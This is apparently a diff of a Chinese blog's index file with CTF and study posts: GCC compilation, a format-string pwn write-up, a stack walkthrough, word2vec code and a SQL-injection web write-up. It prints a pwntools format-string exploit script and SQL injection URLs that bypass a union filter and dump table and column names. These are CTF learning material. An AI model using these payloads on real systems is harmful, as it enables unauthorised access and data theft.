%eax</span><br><span class="line">callprintf@PLT</span><br><span class="line">nop</span><br><span class="line">popq%rbp</span><br><span class="line">.cfi_def_cfa 7, 8</span><br><span class="line">ret</span><br><span class="line">.cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">.sizefoo, .-foo</span><br><span class="line">.ident&quot;GCC: (Debian 10.2.1-6) 10.2.1 20210110&quot;</span><br><span class="line">.section.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><h2 id="汇编">汇编</h2><p>汇编器根据汇编指定和机器指令对应的表进行翻译，生成目标文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>此时hello.o是一个可重定位文件</p><figure><img src="../images/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/2348945-20211111182739761-2004410264.png" alt="image-20211111182736299" /><figcaption aria-hidden="true">image-20211111182736299</figcaption></figure><p>使用objdump查看内容，可以发现此时由于没有链接，导致字符串的起始地址为0x0000，函数地址也用foo标识。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ocjdump -sd hello.o -M intel</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">hello.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 be050000 00488d3d 00000000 b8000000  .....H.=........</span><br><span class="line"> 0020 00e80000 0000905d c3                 .......].       </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 48657265 20697320 61207465 7374206f  Here is a test o</span><br><span class="line"> 0010 66206763 63002564 0a00               f gcc.%d..      </span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202844 65626961 6e203130  .GCC: (Debian 10</span><br><span class="line"> 0010 2e322e31 2d362920 31302e32 2e312032  .2.1-6) 10.2.1 2</span><br><span class="line"> 0020 30323130 31313000                    0210110.        </span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 29000000 00410e10 8602430d  ....)....A....C.</span><br><span class="line"> 0030 06640c07 08000000                    .d......        </span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;foo&gt;:</span><br><span class="line">   0:   55                      push   rbp</span><br><span class="line">   1:   48 89 e5                mov    rbp,rsp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    rdi,[rip+0x0]        # b &lt;foo+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          call   10 &lt;foo+0x10&gt;</span><br><span class="line">  10:   be 05 00 00 00          mov    esi,0x5</span><br><span class="line">  15:   48 8d 3d 00 00 00 00    lea    rdi,[rip+0x0]        # 1c &lt;foo+0x1c&gt;</span><br><span class="line">  1c:   b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">  21:   e8 00 00 00 00          call   26 &lt;foo+0x26&gt;</span><br><span class="line">  26:   90                      nop</span><br><span class="line">  27:   5d                      pop    rbp</span><br><span class="line">  28:   c3                      ret    </span><br></pre></td></tr></table></figure><h2 id="链接">链接</h2><p>gcc默认使用动态链接，加入-static选项即可静态链接。将目标文件及其依赖库进行连接，生成可执行文件，主要包括 <strong>地址和空间分配</strong>，<strong>符号绑定</strong>，<strong>重定位</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello -static</span><br></pre></td></tr></table></figure><p>由于使用静态链接，导致objdump后存在大量汇编指令</p><h2 id="参考">参考</h2><p><a href="https://zhuanlan.zhihu.com/p/380180101">gcc 编译命令详解及最佳实践 - 知乎 (zhihu.com)</a></p>]]></content>
+      
+      
       <categories>
-        <category>machine_learning</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>model</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/10/17/hello-world.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h2 id="quick-start">Quick Start</h2>
-<p><span class="math display">\[hello sdsd(\frac{a}{b})\]</span></p>
-<p><img src="/images/hello-world/image-20211017201247881.png" /></p>
-<h3 id="create-a-new-post">Create a new post</h3>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211017194040110-1069279989.png" /></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="run-server">Run server</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="generate-static-files">Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="deploy-to-remote-sites">Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xctf-CGfsd</title>
+      <link href="/2021/11/12/xctf-CGfsd.html"/>
+      <url>/2021/11/12/xctf-CGfsd.html</url>
+      
+        <content type="html"><![CDATA[<p>PWN中的格式化字符漏洞，从实践出发。</p><span id="more"></span><h2 id="printf格式化字符串">printf格式化字符串</h2><h3 id="基础知识">基础知识</h3><p>printf常见用法,前面是format，后面是匹配的参数。printf本身可以输入无限参数，即printf不知道参数个数，有格式化字符串%s,%d,%c等就到栈中去取参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br></pre></td></tr></table></figure><p>有一个特殊的格式化字符串%n,将前面的字符数量输入到参数中，赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;aaaa%n&quot;,&amp;d);// d=4</span><br></pre></td></tr></table></figure><p>介绍一个格式化字符串的用法<strong>%5$d</strong>,表示参数从左到右第5个参数，好多博客这里没有讲，但是不同类型会不会有影响就不知道了，比如参数的类型不同，size不同，printf是不知道栈的那个位置具体是什么类型的。</p><p>直接输出s，没有格式化字符串。一般情况下是正常的输出s。但是一旦s中存在格式化字符串就可能存在漏洞。这个时候<strong>s就相当于format</strong>，但是没有传入任何参数。printf就会<strong>从栈顶开始依次匹配</strong>相应的类型大小数据输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(s);</span><br></pre></td></tr></table></figure><h3 id="实例">实例</h3><p>写一个小的C文件看看。</p><figure><img src="../images/xctf-CGfsd/2348945-20210924214658533-1665723789.png" alt="image-20210924214653390" /><figcaption aria-hidden="true">image-20210924214653390</figcaption></figure><p>输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x,可以发现从栈顶开始依次输出。可以看到地址61FE3C的位置存储着s字符串。匹配的第7个单元是s的实际存储位置。</p><p><strong>主要是中间调用了printf函数导致很难具体分析栈空间，所以需要使用这种方法找到偏移位置。</strong></p><figure><img src="../images/xctf-CGfsd/2348945-20210924214649609-1405132903.png" alt="image-20210924214644435" /><figcaption aria-hidden="true">image-20210924214644435</figcaption></figure><figure><img src="../images/xctf-CGfsd/2348945-20210924220054329-1040800902.png" alt="image-20210924220048916" /><figcaption aria-hidden="true">image-20210924220048916</figcaption></figure><h2 id="xtf_cgfsd">XTF_CGFSD</h2><figure><img src="../images/xctf-CGfsd/2348945-20210924220519202-68676763.png" alt="image-20210924220513883" /><figcaption aria-hidden="true">image-20210924220513883</figcaption></figure><p><strong>目标：</strong>将pwnme的地址放到字符串s中，并且使用%(offset)$n将输出的字符串长度8放到那个地址中。将那个地址作为printf传入的第offset个参数。</p><figure><img src="../images/xctf-CGfsd/2348945-20210924214603821-1020535736.png" alt="image-20210924214557978" /><figcaption aria-hidden="true">image-20210924214557978</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">55024</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please tell me your name:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;sdsds&quot;</span>)</span><br><span class="line">p=<span class="number">0x804A068</span></span><br><span class="line">payload=p32(p)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%10$n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;leave your message please:&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure><img src="../images/xctf-CGfsd/2348945-20210924214806885-2131536334.png" alt="image-20210924214801629" /><figcaption aria-hidden="true">image-20210924214801629</figcaption></figure>]]></content>
+      
+      
       <categories>
-        <category>time</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Word2vec</title>
-    <url>/2021/10/17/word2vec.html</url>
-    <content><![CDATA[<h2 id="简介">简介</h2>
-<p>Word2Vec是语言模型中的一种，它是从大量文本预料中以无监督方式学习语义知识的模型，被广泛地应用于自然语言处理中。</p>
-<p>Word2Vec是用来生成词向量的工具，而词向量与语言模型有着密切的关系。</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h2 id="基础概念">基础概念</h2>
-<h3 id="语料">语料</h3>
-<p>看word2vec之前可以先看<a href="https://www.cnblogs.com/dddddblog/p/n_gram.html">n-gram模型</a></p>
-<p>word2vec是一个统计语言模型，通过计算条件概率来预测和生成向量。</p>
-<p>n-gram模型在语料库足够大的情况下，不单独统计各个条件概率，而是直接使用这种大概的方式，减少计算</p>
-<p>​ <span class="math display">\[p(w_k|w_{k-n+1},...,w_{k-1}) = \frac{count(w_{k-n},...,w_k)}{count(w_{k-n+1},...w_{k-1})}\]</span></p>
-<p>参数n（word2vec中的窗口大小）确定需要根据模型参数的数量来确定。一般来说越大越好，后面效果增加减少。</p>
-<p>对于统计语言模型而言，利用最大似然，可把目标函数设为：</p>
-<p><img src="https://www.zhihu.com/equation?tex=+%5Cprod_%7Bw+%5Cin+C%7D%5E%7B%7D+p%28w%7CContext%28w%29%29+%5C%5C" alt="[公式]" /> 其中，C表示语料(Corpus)，Context(w)表示词w的上下文，即w周边的词的集合。当Context(w)为空时，就取 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29%3D+p%28w%29" alt="[公式]" /> 。特别地，对于前面介绍的n-gram模型，就有 <img src="https://www.zhihu.com/equation?tex=Context%28w_%7Bi%7D+%3D+w_%7Bi-n%2B1%7D%2C...%2Cw_%7Bi-1%7D%29" alt="[公式]" /> 。</p>
-<h3 id="模型基础">模型基础</h3>
-<p>当然，实际应用中常采用最大对数似然，即把目标函数设为</p>
-<p><img src="https://www.zhihu.com/equation?tex=L+%3D+%5Csum_%7Bw+%5Cin+C%7D%5E%7B%7D%7Blog+p%28w%7CContext%28w%29%29%7D++%5Ctag%7B4%7D%5C%5C" alt="[公式]" /> 然后对这个函数进行最大化。</p>
-<p>从公式（4）可见，概率 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29" alt="[公式]" /> 已被视为关于w和Context(w)的函数，即：</p>
-<p><img src="https://www.zhihu.com/equation?tex=+p%28w%7CContext%28w%29%29+%3D+F%28w%2C+Context%28w%29%2C+%5Ctheta%29+%5C%5C" alt="[公式]" /> 其中 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 为待定参数集。这样一来，一旦对（4）进行优化得到最优参数集 <img src="https://www.zhihu.com/equation?tex=%5Ctheta%5E%7B+%2A%7D" alt="[公式]" /> 后，F也就唯一被确定了，以后任何概率p(w|Context(w))就可以通过函数 <img src="https://www.zhihu.com/equation?tex=F%28w%2C+Context%28w%29%2C+%5Ctheta%5E%7B+%2A%7D%29" alt="[公式]" /> 来计算了。与n-gram相比，这种方法不需要事先计算并保存所有的概率值，而是通过直接计算来获取，且通选取合适的模型可使得 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 中参数的个数远小于n-gram中模型参数的个数。</p>
-<h2 id="word2vec网络结构">word2vec网络结构</h2>
-<p>word2vec是轻量级的神经网络，其模型仅仅包括输入层、隐藏层和输出层，分为CBOW和Skip-gram模型。CBOW是知道上下文语料的情况下，预测当前的词。skip-gram则是根据一个词预测上下文。上下文是指根据window_size设置的前后各n个词。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211013225352657-2105331470.png" /></p>
-<h3 id="cbow模型">CBOW模型</h3>
-<p><img src="https://pic3.zhimg.com/80/v2-55eadeeae1fb93907d9b3da9aabed576_720w.jpg" /></p>
-<h3 id="skip-gram模型">skip-gram模型</h3>
-<p><img src="https://pic4.zhimg.com/80/v2-3baa8ea48cf7028510871a2894ffbb97_720w.jpg" /></p>
-<h2 id="word2vec实践">word2vec实践</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.autograd <span class="keyword">as</span> autograd</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CONTEXT_SIZE = <span class="number">2</span>  <span class="comment"># 2 words to the left, 2 to the right</span></span><br><span class="line">raw_text = <span class="string">&quot;&quot;&quot;We are about to study the idea of a computational process.</span></span><br><span class="line"><span class="string">Computational processes are abstract beings that inhabit computers.</span></span><br><span class="line"><span class="string">As they evolve, processes manipulate other abstract things called data.</span></span><br><span class="line"><span class="string">The evolution of a process is directed by a pattern of rules</span></span><br><span class="line"><span class="string">called a program. People create programs to direct processes. In effect,</span></span><br><span class="line"><span class="string">we conjure the spirits of the computer with our spells.&quot;&quot;&quot;</span>.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># By deriving a set from `raw_text`, we deduplicate the array</span></span><br><span class="line">vocab = <span class="built_in">set</span>(raw_text)</span><br><span class="line">vocab_size = <span class="built_in">len</span>(vocab)</span><br><span class="line"></span><br><span class="line">word_to_ix = &#123;word: i <span class="keyword">for</span> i, word <span class="keyword">in</span> <span class="built_in">enumerate</span>(vocab)&#125;</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(raw_text) - <span class="number">2</span>):</span><br><span class="line">    context = [raw_text[i - <span class="number">2</span>], raw_text[i - <span class="number">1</span>],</span><br><span class="line">               raw_text[i + <span class="number">1</span>], raw_text[i + <span class="number">2</span>]]</span><br><span class="line">    target = raw_text[i]</span><br><span class="line">    data.append((context, target))</span><br><span class="line"><span class="built_in">print</span>(data[:<span class="number">5</span>])</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBOW</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, vocab_size, embedding_dim, context_size</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CBOW, self).__init__()</span><br><span class="line">        self.embeddings = nn.Embedding(vocab_size, embedding_dim)</span><br><span class="line">        self.linear1 = nn.Linear(context_size * embedding_dim, <span class="number">128</span>)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">128</span>, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        embeds = self.embeddings(inputs).view((<span class="number">1</span>, -<span class="number">1</span>))</span><br><span class="line">        out = F.relu(self.linear1(embeds))</span><br><span class="line">        out = self.linear2(out)</span><br><span class="line">        log_probs = F.log_softmax(out, dim=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>(log_probs)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_context_vector</span>(<span class="params">context, word_to_ix</span>):</span></span><br><span class="line">    idxs = [word_to_ix[w] <span class="keyword">for</span> w <span class="keyword">in</span> context]</span><br><span class="line">    <span class="keyword">return</span> torch.tensor(idxs, dtype=torch.long)</span><br><span class="line">make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">device = torch.device(<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">losses = []</span><br><span class="line">loss_function = nn.NLLLoss()</span><br><span class="line">model = CBOW(<span class="built_in">len</span>(vocab), embedding_dim=<span class="number">10</span>, context_size=CONTEXT_SIZE*<span class="number">2</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    total_loss = torch.Tensor([<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> context, target <span class="keyword">in</span> data:</span><br><span class="line">        context_ids = make_context_vector(context, word_to_ix)</span><br><span class="line">        context_ids = context_ids.to(device)</span><br><span class="line">        model.zero_grad()</span><br><span class="line">        log_probs = model(context_ids)</span><br><span class="line">        label = torch.tensor([word_to_ix[target]], dtype=torch.long)</span><br><span class="line">        label = label.to(device)</span><br><span class="line">        loss = loss_function(log_probs, label)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += loss.item()</span><br><span class="line">    losses.append(total_loss)</span><br><span class="line"><span class="built_in">print</span>(losses)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.embeddings(make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix))</span><br></pre></td></tr></table></figure>
-<h2 id="参考">参考</h2>
-<p>[1] <a href="https://zhuanlan.zhihu.com/p/114538417">深入浅出Word2Vec原理解析 - 知乎 (zhihu.com)</a></p>
-<p>[2] <a href="https://samaelchen.github.io/word2vec_pytorch/">word2vec的PyTorch实现 | 碎碎念 (samaelchen.github.io)</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>C语言函数调用栈的变化</title>
+      <link href="/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html"/>
+      <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
+      
+        <content type="html"><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p><span id="more"></span><h2 id="写一个简单的c程序">写一个简单的C程序</h2><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" alt="image-20210928175428688" /><figcaption aria-hidden="true">image-20210928175428688</figcaption></figure><h2 id="od调试">OD调试</h2><p>备注OD中显示的字符串顺序和字节顺序相反。olle<img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p><p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption></figure><p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption></figure><p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p><p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption></figure><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption></figure><p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p><p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption></figure><p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption></figure><p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption></figure><p>最后执行retn，EIP=0x40152E</p><figure><img src="../images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption></figure><h2 id="总结">总结</h2><p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p><p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>]]></content>
+      
+      
       <categories>
-        <category>deep_learning</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>model</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xctf-fakebook</title>
-    <url>/2021/11/12/xctf-fakebook.html</url>
-    <content><![CDATA[<p>攻防世界-web-fakebook结题过程</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h3 id="使用dirmap扫描">使用dirmap扫描</h3>
-<p>查看网页，发现只有login和join两个功能，扫描结果：<img src="../images/xctf-fakebook/2348945-20210803091934485-1631918819.png" /></p>
-<p>login用于登录，join.php用于注册用户，view.php</p>
-<p>因为刚开始使用dirmap，字典很差很多没扫出来，尤其是flag.php</p>
-<h3 id="寻找注入点爆破">寻找注入点爆破</h3>
-<ol type="1">
-<li><p>注册登录后进入<code>http://111.200.241.244:54207/view.php?no=1</code>，可能存在注入，可以尝试一下，但是目前只有一个用户。<img src="../images/xctf-fakebook/2348945-20210803092319661-797664669.png" alt="image-20210803092317796" style="zoom: 50%;" /></p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=2-1</code>，页面不变，发现是数字型注入。</p></li>
-<li><p>使用<code>http://111.200.241.244:54207/view.php?no=1%20order by 4 %23</code>,返回，列数为4.</p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20select%201,2,3,4%20%23</code></p>
-<p>联合查询被检测到了。<img src="../images/xctf-fakebook/2348945-20210803092855345-1138880396.png" alt="image-20210803092853586" /></p></li>
-<li><p>试试布尔盲注<code>http://111.200.241.244:54207/view.php?no=1%20and%200%20%23</code>成功了。下面又试试这个成功了。写代码是不能的，还是直接sqlmap来的快。尝试了一下发现响应太慢？？？？不得行啊。 手动发现数据库名长度为8，难道真的要依次试试嘛。第一个字符为f，难道就是flag？</p>
-<p>发现正确的，响应时间很长，错误的响应时间很短。应该就是fakebook就是这个嘛 。</p>
-<figure>
-<img src="../images/xctf-fakebook/2348945-20210803093525594-61070285.png" alt="image-20210803093523771" /><figcaption aria-hidden="true">image-20210803093523771</figcaption>
-</figure></li>
-<li><p>又试试报错，显示了报错信息。但是又不能使用updatexml，其他的没试。<img src="../images/xctf-fakebook/2348945-20210803093258691-1812634557.png" alt="image-20210803093256905" /></p>
-<figure>
-<img src="../images/xctf-fakebook/2348945-20210803093102514-1853772178.png" alt="image-20210803093100610" /><figcaption aria-hidden="true">image-20210803093100610</figcaption>
-</figure></li>
-<li><p>百度了一下，发现union select过滤的绕过可以使用union all select 绕过。或者union\**<img src="../images/xctf-fakebook/2348945-20210803095205266-1077013596.png" alt="image-20210803095203278" /></p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%22fakebook%22%20%23</code></p>
-<p>发现users表</p></li>
-<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%22users%22%20%23</code><img src="../images/xctf-fakebook/2348945-20210803095411100-648756374.png" alt="image-20210803095409210" /></p></li>
-<li><p>data列中是O:8:"UserInfo":3:{s:4:"name";s:5:"jason";s:3:"age";i:0;s:4:"blog";s:9:"jason.com";} 明显是用户类序列化的结果。不对啊，我要的是flag啊，这是啥啊。还是看writeup把，好家伙user.php.bak没扫出来，字典垃圾了，赶紧加上。</p></li>
-<li><p>查看user.php.bak，大概就是view.php中的内容，核心在有一个网络请求blog中。</p></li>
-<li><p>根据扫描结果可以知道根目录下有一个flag.php但是浏览器打开啥也没有。</p></li>
